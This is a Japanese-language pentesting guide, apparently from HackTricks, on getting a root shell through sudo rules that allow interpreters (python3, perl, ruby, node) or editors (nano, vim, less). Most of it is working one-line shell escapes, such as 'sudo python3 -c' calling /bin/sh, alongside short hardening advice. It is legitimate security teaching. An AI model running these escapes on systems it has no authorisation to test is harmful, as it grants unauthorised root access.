# Sudo Command Abuse

## Sudo-allowed interpreters

`sudo -l` でユーザーが root として interpreter を実行できる場合、直接的な code execution として扱います。interpreter は任意の code を実行するように設計されているため、`python3`、`perl`、`ruby`、`lua`、`node`、または同様の binary の実行を許可する rule は、引数が厳密に制限・検証されていない限り、通常は root command execution と同等です。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

一般的な review flow では、まずユーザーの privileges を列挙し、次に interpreter の `-c` option を使用して Python statement を実行します。<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
その他の interpreter の例を以下に示します。リストに記載された interpreter では、inline-code の実行または child-process API について説明されています。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
正確なパスが重要です。sudo ルールで `/usr/bin/python3` が許可されている場合は、検証時にその正確なパスを使用してください。<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-allowed editors

`sudo -l` によってユーザーが root として interactive editor を実行できる場合、それを安全なファイル編集権限ではなく、command-execution surface として扱います。editor は、多くの場合、shell commands の実行、任意のファイルの読み取り・書き込み、または editor 内からの外部ヘルパーの呼び出しを可能にします。<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

一般的な review flow では、まずユーザーの privileges を一覧表示し、その後、sudo 経由で許可されている各 editor または pager を起動します。<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

`nano` が sudo 経由で許可されている場合、エディタのインターフェースから command execution に到達できる可能性があります。<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
次に、`id` や `/bin/sh` などのコマンドを nano command prompt に入力します。<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
対話型 shell に利用可能な terminal streams がない場合、このリダイレクト形式は標準出力と標準エラーを descriptor 0 にマッピングします。<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
nano のバージョンやビルドオプションによって正確なキーシーケンスは異なる場合がありますが、security issue は同じです。editor は root として実行され、external commands を呼び出せます。<sup>[[1]](#references)[[12]](#references)</sup>

### その他の一般的な editor escape

Vim-style editors では、通常 `:!` による command execution が利用できます。<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
`less` などのPagersでは、shell executionも実行できます。<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## 防御に関する注意事項

- sudo を介して interpreters や interactive editors を許可することは避けてください。<sup>[[1]](#references)</sup>
- 1つの限定的な管理操作だけを実行する、固定された root 所有の wrappers を優先してください。<sup>[[1]](#references)[[2]](#references)</sup>
- interpreter が避けられない場合は、正確な script path を制限し、ユーザーが制御する arguments、書き込み可能な imports、`PYTHONPATH`、および安全でない environment preservation を防止してください。<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- file editing が必要な場合は、正確な file path を制限し、patched sudo versions と strict environment handling を使用した `sudoedit` を検討してください。<sup>[[1]](#references)[[2]](#references)</sup>
- `SETENV`、`env_keep`、書き込み可能な working directories、書き込み可能な module/import paths、`NOEXEC`、`use_pty`、logging を確認してください。ただし、これらを完全な sandbox とみなしてはいけません。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Python ドキュメント](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Miscellaneous operating system interfaces — Python ドキュメント](https://docs.python.org/3/library/os.html)
- [5] [perlrun — Perl interpreter の実行方法](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl ドキュメント](https://perldoc.perl.org/functions/exec)
- [7] [Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby ドキュメント](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Node.js ドキュメント](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js ドキュメント](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua man page](https://www.lua.org/manual/5.4/lua.html)
- [12] [The GNU nano text editor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux マニュアルページ](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash Reference Manual](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
